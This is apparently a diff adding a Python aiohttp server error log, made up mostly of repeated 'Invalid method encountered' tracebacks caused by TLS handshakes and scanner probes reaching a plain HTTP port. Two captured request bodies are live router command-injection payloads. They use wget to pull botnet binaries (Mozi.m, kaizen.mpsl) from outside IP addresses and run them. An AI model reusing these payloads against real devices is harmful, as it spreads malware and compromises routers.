+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x016\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x02b\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01\x01\xbbh\x10\xb9\xf1'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x89\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://46.227.184.199:50513/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0'
+                                                                                                                            ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x12\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+kaizen.mpsl%3B+wget+http%3A%2F%2F176.65.149.168%2Fbins%2Fkaizen.mpsl%3B+chmod+777+kaizen.mpsl%3B+.%2Fkaizen.mpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1'
+                                                                                                                                                                                                                                     ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x016\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x05\xc6\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01\x01\xbbh\x10\xb9\xf1'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x12\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x05\xc2\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
